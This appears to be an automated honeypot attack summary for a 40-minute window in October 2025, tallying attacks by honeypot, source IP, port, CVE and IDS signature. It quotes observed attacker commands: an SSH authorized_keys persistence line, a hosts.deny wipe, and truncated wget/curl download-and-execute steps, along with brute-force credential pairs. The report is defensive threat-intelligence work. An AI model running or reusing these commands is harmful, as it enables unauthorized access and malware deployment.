
# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-05T19:01:36Z
**Timeframe Covered:** 2025-10-05T18:20:01Z to 2025-10-05T19:00:01Z
**Log Files Used:**
- agg_log_20251005T182001Z.json
- agg_log_20251005T184001Z.json
- agg_log_20251005T190001Z.json

## Executive Summary

This report summarizes 15,430 attacks recorded across multiple honeypots. The majority of attacks were captured by the Cowrie honeypot, indicating a high volume of SSH and Telnet-based threats. A significant portion of the attacks originated from the IP address `103.179.56.29`. The most targeted ports were 22 (SSH) and 25 (SMTP). Attackers were observed attempting to deploy malicious scripts via `wget` and `curl`, and attempting to gain persistence by adding their SSH keys to the `authorized_keys` file. Several CVEs were targeted, with `CVE-2019-11500` being the most frequent.

## Detailed Analysis

### Attacks by Honeypot
- **Cowrie:** 9469
- **Mailoney:** 1669
- **Suricata:** 1492
- **Ciscoasa:** 1383
- **Honeytrap:** 793
- **Sentrypeer:** 410
- **Adbhoney:** 33
- **Redishoneypot:** 37
- **H0neytr4p:** 28
- **Honeyaml:** 26
- **Dionaea:** 27
- **Tanner:** 20
- **Miniprint:** 24
- **ElasticPot:** 8
- **Ipphoney:** 9
- **ConPot:** 2

### Top Attacking IPs
- **103.179.56.29:** 3593
- **139.59.180.82:** 1246
- **86.54.42.238:** 821
- **176.65.141.117:** 820
- **196.251.80.29:** 459
- **113.45.38.160:** 479
- **190.129.122.185:** 304
- **74.208.146.60:** 282
- **172.86.95.98:** 376
- **5.181.219.139:** 353

### Top Targeted Ports/Protocols
- **22:** 1781
- **25:** 1669
- **5060:** 410
- **TCP/5900:** 199
- **TCP/22:** 53
- **80:** 28
- **443:** 30
- **UDP/5060:** 30
- **TCP/80:** 32
- **9100:** 24
- **6379:** 34

### Most Common CVEs
- **CVE-2019-11500:** 8
- **CVE-2021-3449:** 7
- **CVE-2002-0013 CVE-2002-0012:** 2
- **CVE-2006-3602 CVE-2006-4458 CVE-2006-4542:** 1
- **CVE-2001-0414:** 1

### Commands Attempted by Attackers
- **`cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ... mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`**: 19
- **`lockr -ia .ssh`**: 19
- **`cd ~; chattr -ia .ssh; lockr -ia .ssh`**: 19
- Reconnaissance commands (`uname -a`, `whoami`, `lscpu`, `w`, `crontab -l`, etc.): very frequent
- **`rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;`**: 8
- **`cd /data/local/tmp/; busybox wget ...; sh w.sh; curl ...; sh c.sh; ...`**: multiple variations observed

### Signatures Triggered
- **ET DROP Dshield Block Listed Source group 1:** 337
- **2402000:** 337
- **ET DROP Spamhaus DROP Listed Traffic Inbound group 41:** 212
- **2400040:** 212
- **ET SCAN NMAP -sS window 1024:** 151
- **2009582:** 151
- **ET INFO Reserved Internal IP Traffic:** 61
- **2002752:** 61
- **ET SCAN Potential SSH Scan:** 40
- **2001219:** 40

### Users / Login Attempts
- **345gs5662d34/345gs5662d34:** 17
- **root/3245gs5662d34:** 9
- **root/nPSpP4PBW0:** 10
- **root/2glehe5t24th1issZs:** 8
- **test/zhbjETuyMffoL8F:** 6
- **root/LeitboGi0ro:** 6

### Files Uploaded/Downloaded
- **wget.sh;**: 12
- **w.sh;**: 3
- **c.sh;**: 3

### HTTP User-Agents
- None recorded.

### SSH Clients and Servers
- None recorded.

### Top Attacker AS Organizations
- None recorded.

## Key Observations and Anomalies

1.  **Automated SSH attacks:** The high frequency of commands related to manipulating the `.ssh/authorized_keys` file indicates a widespread automated campaign to gain persistent access to compromised machines. The SSH key used in these attempts is consistent across multiple attacking IPs.

2.  **Downloader and dropper activity:** Attackers are using `wget` and `curl` to download and execute shell scripts (`w.sh`, `c.sh`, `wget.sh`) from external servers. This is a common tactic for deploying malware, botnet clients, or crypto miners.

3.  **System Reconnaissance:** After gaining initial access, attackers run a series of commands to gather information about the system's hardware, uptime, and running processes. This suggests an attempt to understand the environment before deploying a final payload.

4.  **High-Volume Scanners:** IPs like `103.179.56.29` and `139.59.180.82` are responsible for a large number of connections, indicating they are likely part of a large-scale scanning operation.
